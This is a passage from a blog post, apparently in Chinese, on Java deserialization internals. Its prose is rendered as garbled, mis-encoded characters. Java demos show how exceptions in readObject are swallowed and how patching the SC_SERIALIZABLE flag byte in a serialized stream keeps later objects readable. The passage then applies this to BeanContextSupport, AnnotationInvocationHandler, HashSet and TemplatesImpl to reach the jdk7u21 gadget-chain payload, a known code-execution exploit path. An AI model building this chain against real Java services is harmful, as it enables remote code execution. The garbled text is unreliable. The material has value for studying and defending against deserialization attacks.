class="line">    <span class="keyword">public</span> String s;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream i)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        i.defaultReadObject();</span><br><span class="line">        System.out.println(<span class="string">&quot;THROW&quot;</span>);</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> Exception(<span class="string">&quot;Error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> <span class="keyword">implements</span> <span class="title">Serializable</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> B b;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeObject</span><span class="params">(ObjectOutputStream o)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        o.defaultWriteObject();</span><br><span class="line">        o.writeObject(b);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream i)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            i.defaultReadObject();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;&#125;</span><br><span class="line">        System.out.println(((B)i.readObject()).s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestClass</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        B b = <span class="keyword">new</span> B();</span><br><span class="line">        b.s = <span class="string">&quot;OK&quot;</span>;</span><br><span class="line">        A a = <span class="keyword">new</span> A();</span><br><span class="line">        a.b = b;</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream barr = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(barr);</span><br><span class="line">        oos.writeObject(a);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> ByteArrayInputStream(barr.toByteArray()));</span><br><span class="line">        ois.readObject();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>å¾—åˆ°ç»“æœğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202171402818.png" alt="image-20220217140240635"></p>
<p>å¯è§è™½ç„¶ <code>B</code> ç±»åœ¨ <code>A</code> ç±»çš„ <code>defaultReadObject</code> ä¸­æœ‰ <code>throw</code> å‡ºé”™è¯¯ï¼Œä½† <code>B</code> ç±» <code>ååºåˆ—åŒ–</code> å¾—åˆ°çš„å®ä¾‹è¿˜æ˜¯åœ¨çš„ï¼Œä»è€Œåœ¨ <code>System.out.println(((B)i.readObject()).s)</code> äºŒæ¬¡è°ƒç”¨åŒä¸€ä¸ª <code>B</code> ç±»å®ä¾‹æ—¶å¹¶æ²¡æœ‰å†æ¬¡è°ƒç”¨ <code>B</code>ç±»çš„ <code>readObject</code> æ–¹æ³•ã€‚å½“ç„¶ï¼Œå‰ææ˜¯ <code>B</code> ç±»åœ¨å…¶ <code>readObject</code> æ–¹æ³•ä¸­ <code>throw</code> å‡ºé”™è¯¯å‰ï¼Œå¾—å…ˆ <code>defaultReadObject</code> è¯»å–åºåˆ—åŒ–æ•°æ®ã€‚</p>
<p>ä½†å¦‚æœæ˜¯åœ¨ <code>readObject</code> ä¸­ <code>throw</code> å‡ºäº†é”™è¯¯ï¼Œåˆ™ä¸‹ä¸€æ®µçš„ <code>readObject</code> åˆ™ä¼š <code>throw</code> å‡º <code>IOException</code> ğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202171427926.png" alt="image-20220217142712729"></p>
<p>é‚£ä¹ˆå¦‚ä½•è§„é¿è¿™ç±»é”™è¯¯å‘¢ï¼Œç»è¿‡è°ƒè¯•ï¼Œå½“è°ƒç”¨åˆ° <code>Object c = i.readObject()</code> æ—¶ï¼Œé”™è¯¯æ¥è‡ª <code>ObjectInputStream</code> ç±»çš„ <code>readObject0</code> æ–¹æ³•ğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202171454240.png" alt="image-20220217145402093"></p>
<p>æ­¤æ—¶ <code>defaultDataEnd</code> å±æ€§çš„å€¼ä¸º <code>true</code> ï¼Œä¹Ÿå°±ä¼šæ‰§è¡Œåˆ°äº† <code>throw new OptionalDataException(true)</code> ï¼Œå› æ­¤ç°åœ¨çš„ç›®æ ‡æ˜¯å¦‚ä½•è®© <code>defaultDataEnd</code> å±æ€§ä¸€ç›´ä¸º <code>false</code> ã€‚</p>
<p>å…ˆæ¥çœ‹ <code>defaultDataEnd</code> å±æ€§çš„é»˜è®¤å€¼ğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202171508762.png" alt="image-20220217150819709"></p>
<p>æ˜¯ä¸º <code>false</code> çš„ï¼Œä¹Ÿå°±æ˜¯è¯´ä¸€å®šåœ¨æŸä¸ªæ—¶åˆ»å°†å…¶èµ‹å€¼æˆäº† <code>true</code> ï¼Œå…¨å±€æœç´¢å°† <code>defaultDataEnd</code> è®¾ä¸º <code>true</code> çš„æ–¹æ³•ï¼Œå¯ä»¥å‘ç°åœ¨ <code>defaultReadObject</code> æ–¹æ³•ä¸­å¦‚æœè°ƒç”¨è¯¥æ–¹æ³•çš„ç±»ä¸å­˜åœ¨ <code>writeObject</code> æ–¹æ³•ï¼Œåˆ™ä¼šå°† <code>defaultDataEnd</code> å±æ€§è®¾ä¸º <code>true</code>ğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202171515939.png" alt="image-20220217151527839"></p>
<p>ä¹Ÿå°±æ˜¯è¯´æ¯æ¬¡åœ¨ <code>readObject</code> æ–¹æ³•é‡Œå¦‚æœæœ‰å¯¹ <code>defaultReadObject</code> æ–¹æ³•çš„è°ƒç”¨ï¼Œ<code>defaultDataEnd</code> å±æ€§å°±ä¼šè¢«è®¾ä¸º <code>true</code>ã€‚</p>
<p>æ¥ç€å¯¹æ•´ä¸ª <code>ååºåˆ—åŒ–</code> è¿‡ç¨‹è¿›è¡Œè°ƒè¯•ï¼Œåœ¨ <code>ObjectInputStream</code> ç±»çš„ <code>readSerialData</code> æ–¹æ³•ä¸­æœ‰å¯¹ç›¸åº”ç±» <code>readObject</code> æ–¹æ³•çš„è°ƒç”¨ğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202171512376.png" alt="image-20220217151232227"></p>
<p>è€Œå¦‚æœæˆåŠŸè°ƒç”¨äº† <code>readObject</code> æ–¹æ³•ï¼Œå³åœ¨æ²¡æœ‰æŠ¥é”™çš„æƒ…å†µä¸‹ä¼šå°† <code>defaultDataEnd</code> è®¾ä¸º <code>false</code> ï¼Œé‚£ä¹ˆåªè¦ä¿è¯å¦‚æœè¿›è¡Œ <code>ååºåˆ—åŒ–</code> ä¼šæŠ¥é”™çš„ç±»æ‹¥æœ‰ <code>writeObject</code> æ–¹æ³•å°±å¯ä»¥è§„é¿è®© <code>defaultDataEnd</code> ä¸º <code>true</code> çš„æƒ…å†µäº†ã€‚</p>
<p>ä½†ä»…ä»…æ˜¯è®©è¿›è¡Œ <code>ååºåˆ—åŒ–</code> ä¼šæŠ¥é”™çš„ç±»ç›´æ¥åŠ ä¸Š <code>writeObject</code> æ–¹æ³•ä¾ç„¶æ˜¯ä¸å¯è¡Œçš„ï¼Œå› ä¸ºä» <code>slotDesc.invokeReadObject(obj, this)</code> è¿™æ®µä»£ç å¯ä»¥çœ‹å‡ºï¼Œå¦‚æœå°† <code>A</code> ç±»å’Œ <code>B</code> ç±»é•¶åµŒåºåˆ—åŒ–ï¼Œåœ¨è¿›è¡Œ <code>ååºåˆ—åŒ–</code> æ—¶æ‰€è§£æçš„å†…å®¹æ˜¯å…±ç”¨çš„ã€‚é‚£ä¹ˆå‡è®¾åœ¨ <code>A</code> ç±»çš„ <code>readObject</code> æ–¹æ³•é‡Œï¼Œå¯¹ <code>B</code> ç±»è¿›è¡Œ <code>readObject</code> æ—¶æŠ¥é”™ï¼Œä½†ç”¨ <code>try</code> å¿½ç•¥äº†é”™è¯¯ï¼Œè€Œ <code>B</code> ç±»åˆæœ‰ <code>writeObject</code> æ–¹æ³•ä¸”æœ‰ <code>writeObject</code> æ“ä½œï¼Œé‚£ä¹ˆåœ¨ <code>A</code> ç±»é‡Œçš„ä¸‹ä¸€ä¸ª <code>readObject</code> è°ƒç”¨ç»“æœä¸º <code>B</code> ç±»ä» <code>writeObject</code> æ–¹æ³•å†™å…¥çš„å†…å®¹ğŸ‘‡</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CC</span> <span class="keyword">implements</span> <span class="title">Serializable</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String s = <span class="string">&quot;c&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BB</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String s = <span class="string">&quot;b&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeObject</span><span class="params">(ObjectOutputStream o)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        o.defaultWriteObject();</span><br><span class="line">        o.writeObject(<span class="keyword">new</span> CC());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream i)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        i.defaultReadObject();</span><br><span class="line">        System.out.println(<span class="string">&quot;THROW&quot;</span>);</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> Exception(<span class="string">&quot;ERROR&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AA</span> <span class="keyword">implements</span> <span class="title">Serializable</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String s = <span class="string">&quot;a&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeObject</span><span class="params">(ObjectOutputStream o)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        o.defaultWriteObject();</span><br><span class="line">        o.writeObject(<span class="keyword">new</span> BB());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream i)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        i.defaultReadObject();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// æ¥è‡ªAA =&gt; writeObject(new BB())</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Object o1 = i.readObject();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;&#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// æ¥è‡ªBB =&gt; writeObject(new CC())</span></span><br><span class="line">        Object o2 = i.readObject();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            CC o22 = (CC) o2;</span><br><span class="line">            System.out.println(o22.s);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestClass2</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream barr = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(barr);</span><br><span class="line">        oos.writeObject(<span class="keyword">new</span> AA());</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> ByteArrayInputStream(barr.toByteArray()));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>æ‰§è¡Œç»“æœğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202171546329.png" alt="image-20220217154603133"></p>
<p>å¯è§åœ¨ <code>AA</code> ç±»ä¸­çš„ç¬¬äºŒä¸ª <code>readObject</code> æ‹¿åˆ°äº† <code>BB</code> ç±»ä¸­ <code>writeObject</code> çš„å†…å®¹ã€‚</p>
<p>å¦‚æœä¸åœ¨ <code>BB</code> ç±»çš„ <code>writeObject</code> å†™å…¥ <code>CC</code> ç±»ï¼Œè€Œæ˜¯åœ¨ <code>AA</code> ç±»çš„ <code>writeObject</code> ä¸­å†™å…¥èƒ½å¦è¡Œå¾—é€šå‘¢ï¼Œæ˜¯ä¸å¯ä»¥çš„ğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202171551233.png" alt="image-20220217155144037"></p>
<p>å¦‚æœè·Ÿè¿›æŠ¥é”™ï¼Œå¯ä»¥çœ‹åˆ°æ˜¯è¯»å–åˆ°äº† <code>TC_ENDBLOCKDATA</code> ğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202171637631.png" alt="image-20220217163738462"></p>
<p>å…¶å®ä¸Šè¿°ä¹‹æ‰€ä»¥æ‹¿åˆ°äº† <code>BB</code> ç±»ä¸­ <code>writeObject</code> çš„å†…å®¹ï¼Œæ˜¯å› ä¸ºå½“ <code>BB</code> ç±»åœ¨è°ƒç”¨è‡ªèº«çš„ <code>readObject</code> æ–¹æ³•æ—¶ <code>throw</code> å‡ºé”™è¯¯ä¸”è¢« <code>try</code> å¿½ç•¥äº†ï¼Œæ­¤æ—¶ <code>ååºåˆ—åŒ–</code> è¯»å–çš„æŒ‡é’ˆä½ç½®çš„ä¸‹ä¸€éƒ¨åˆ†æ˜¯ <code>BB</code> ç±»çš„ <code>writeObject</code> éƒ¨åˆ†ï¼Œ <code>AA</code> ç±»å†æ¬¡è°ƒç”¨ <code>readObject</code> æ–¹æ³•æ—¶ï¼Œå°±ä¼šå°è¯•è¯»å– <code>BB</code> ç±»é¢å¤–çš„ <code>writeObject</code> éƒ¨åˆ†ï¼Œä½†æ­¤æ—¶ <code>BB</code> ç±»é¢å¤–çš„ <code>writeObject</code> éƒ¨åˆ†ä¸ºç©º(è¯»åˆ°äº† <code>TC_ENDBLOCKDATA</code> )ï¼Œå°±æŠ¥é”™äº†ã€‚</p>
<p>é‚£ä¹ˆæœ‰æ²¡æœ‰åŠæ³•è®© <code>AA</code> ç±»åœ¨ <code>ååºåˆ—åŒ–</code> æ—¶å³ä¾¿ <code>BB</code> ç±»å‡ºé”™äº†ï¼Œä½†åˆèƒ½æ‹¿åˆ°å±äºè‡ªå·±å†™å…¥çš„ <code>writeObject</code> å†…å®¹å‘¢ï¼Œç­”æ¡ˆæ˜¯æœ‰çš„ã€‚</p>
<p>ä¸å¦¨å…ˆæ¥çœ‹é‡å†™ <code>writeObject</code> å’Œé»˜è®¤åºåˆ—åŒ–çš„åºåˆ—åŒ–å†…å®¹ğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202171647923.png" alt="image-20220217164738739"></p>
<p>å¯ä»¥çœ‹åˆ°é™¤å¼€ç±»åç§°å¤–çš„ä¸åŒï¼Œé‡å†™ <code>writeObject</code> çš„ç±»åœ¨ <code>serialVersionUID</code> åç´§è·Ÿç€çš„æ˜¯ <code>03</code> ï¼Œè€Œé»˜è®¤åºåˆ—åŒ–çš„ç±»è·Ÿç€çš„æ˜¯ <code>02</code> ï¼Œé€šè¿‡åºåˆ—åŒ–å¸¸é‡çš„å¯¹æ¯”ğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202171648345.png" alt="image-20220217164851263"></p>
<p>æ˜¾ç„¶ <code>03</code> çš„å€¼ä¸º <code>SC_SERIALIZABLE | SC_WRITE_METHOD</code>ï¼Œ <code>02</code> å€¼ä¸º <code>SC_SERIALIZABLE</code> äº†ã€‚</p>
<p>åŒæ—¶é‡å†™ <code>writeObject</code> çš„ç±»æ¯”é»˜è®¤åºåˆ—åŒ–çš„ç±»å¤šå‡ºä¸€ä¸ª <code>78</code> çš„å­—ç¬¦ï¼Œå†æŸ¥çœ‹åºåˆ—åŒ–å¸¸é‡ğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202171651655.png" alt="image-20220217165133594"></p>
<p>å¯è§å¤šå‡ºçš„ <code>78</code>ç«Ÿæ˜¯ <code>TC_ENDBLOCKDATA</code> ï¼Œé‚£ä¹ˆç½ªé­ç¥¸é¦–ä¹Ÿå°±æ‰¾åˆ°äº†ã€‚</p>
<p>å¦‚æœå°†è¿™ä¸ª <code>78</code> å­—ç¬¦å»æ‰ï¼Œå½“ <code>BB</code> ç±»åœ¨è°ƒç”¨è‡ªèº«çš„ <code>readObject</code> æ–¹æ³•æ—¶ <code>throw</code> å‡ºé”™è¯¯ä¸”è¢« <code>try</code> å¿½ç•¥äº†ï¼Œ <code>ååºåˆ—åŒ–</code> è¯»å–çš„æŒ‡é’ˆä½ç½®çš„ä¸‹ä¸€éƒ¨åˆ†å°±ä¸ä¼šæ˜¯ <code>TC_ENDBLOCKDATA</code> ï¼Œè€Œæ˜¯æ¥åœ¨åé¢çš„å…¶ä»–åºåˆ—åŒ–å†…å®¹äº†ï¼Œæœ€ç®€å•çš„æ–¹å¼æ¯”å¦‚ç›´æ¥å°† <code>SC_SERIALIZABLE</code> æ›¿æ¢æˆ <code>SC_SERIALIZABLE | SC_WRITE_METHOD</code> ğŸ‘‡</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xerces.internal.impl.dv.util.HexBin;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CC</span> <span class="keyword">implements</span> <span class="title">Serializable</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String s = <span class="string">&quot;c&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BB</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">65536L</span>;</span><br><span class="line">    <span class="keyword">public</span> String s = <span class="string">&quot;b&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream i)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        i.defaultReadObject();</span><br><span class="line">        System.out.println(<span class="string">&quot;THROW&quot;</span>);</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> Exception(<span class="string">&quot;ERROR&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AA</span> <span class="keyword">implements</span> <span class="title">Serializable</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String s = <span class="string">&quot;a&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeObject</span><span class="params">(ObjectOutputStream o)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        o.defaultWriteObject();</span><br><span class="line">        o.writeObject(<span class="keyword">new</span> BB());</span><br><span class="line">        o.writeObject(<span class="keyword">new</span> CC());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream i)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        i.defaultReadObject();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// æ¥è‡ªAA =&gt; writeObject(new BB())</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Object o1 = i.readObject();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;&#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// æ¥è‡ªAA =&gt; writeObject(new CC())</span></span><br><span class="line">        Object o2 = i.readObject();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            CC o22 = (CC) o2;</span><br><span class="line">            System.out.println(o22.s);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestClass2</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream barr = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(barr);</span><br><span class="line">        oos.writeObject(<span class="keyword">new</span> AA());</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] outBytes = HexBin.decode(HexBin.encode(barr.toByteArray()).replace(<span class="string">&quot;1000002&quot;</span>, <span class="string">&quot;1000003&quot;</span>));</span><br><span class="line"></span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> ByteArrayInputStream(outBytes));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>æ‰§è¡Œç»“æœğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202171659228.png" alt="image-20220217165903033"></p>
<p>æ­¤æ—¶æˆåŠŸåœ°è®© <code>AA</code> ç±»åœ¨ <code>ååºåˆ—åŒ–</code> æ—¶å³ä¾¿ <code>BB</code> ç±»å‡ºé”™äº†ï¼Œä½†åˆèƒ½æ‹¿åˆ°å±äºè‡ªå·±å†™å…¥çš„ <code>writeObject</code> å†…å®¹äº†ã€‚</p>
<p>é‚£ä¹ˆå†å›è¿‡å¤´æ¥çœ‹ <code>BeanContextSupport</code> ç±»çš„ <code>readChildren</code> æ–¹æ³•ğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202171715668.png" alt="image-20220217171506583"></p>
<p>å¦‚æœè®© <code>serializable</code> å±æ€§çš„å€¼ä¸º <code>2</code> ï¼Œç„¶åæ„é€ å¥½ä»¥ä¸‹å†…å®¹çš„ <code>writeObject</code> ğŸ‘‡</p>
<ul>
<li><code>AnnotationInvocationHandç±»</code></li>
<li><code>HashSetç±»</code><ul>
<li><code>HashSet.put([TemplatesImplç±»()])</code></li>
<li><code>HashSet.put([AnnotationInvocationHandç±»()])</code></li>
</ul>
</li>
</ul>
<p>å°±å¯ä»¥å…ˆé€šè¿‡ç¬¬ä¸€æ¬¡å¾ªç¯å°† <code>AnnotationInvocationHand</code> ç±»ç»™ <code>readObject</code> ï¼Œå¹¶ä¸”å¿½ç•¥ <code>throw</code> å‡ºçš„é”™è¯¯ï¼Œå†é€šè¿‡ç¬¬äºŒæ¬¡å¾ªç¯è°ƒç”¨ <code>HashSet</code> ç±»çš„ <code>readObject</code> èµ° <code>jdk7u21</code> é“¾çš„ <code>payload</code> äº†ã€‚</p>
<p>æ¥ç€æ¥çœ‹ <code>AnnotationInvocationHand</code> ç±»çš„ <code>writeObject</code> æ–¹æ³•ğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202171722802.png" alt="image-20220217172223715"></p>
<p>å¦‚æœ <code>serializable &gt; 0 &amp;&amp; this.equals(getBeanContextPeer())</code> æˆç«‹åˆ™ä¼šè°ƒç”¨ <code>writeChildren</code> æ–¹æ³•ï¼Œå…¶ä¸­ <code>serializable</code> æ˜¯å¯æ§ä¸”å¯åºåˆ—åŒ–çš„ğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202171724943.png" alt="image-20220217172413869"></p>
<p>å†è·Ÿè¿› <code>getBeanContextPeer</code> æ–¹æ³•ğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202171725643.png" alt="image-20220217172522599"></p>
<p>ç»§ç»­è·Ÿè¿› <code>getBeanContextChildPeer</code> æ–¹æ³•ğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202171725202.png" alt="image-20220217172547158"></p>
<p>å¯ä»¥çœ‹åˆ°æœ€ç»ˆå€¼æ¥è‡ª <code>beanContextChildPeer</code> å±æ€§ï¼Œè€Œè¿™ä¸ª <code>beanContextChildPeer</code> å±æ€§ä¸º <code>BeanContextChildSupport</code> ç±»è‡ªèº«ğŸ‘‡</p>
<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202202171727254.png" alt="image-20220217172728170"></p>
<p>å¹¶ä¸” <code>BeanContextSupport</code> ç±»æ˜¯ç»§æ‰¿äº† <code>BeanContextChildSupport</code> ç±»çš„ğŸ‘‡</p>
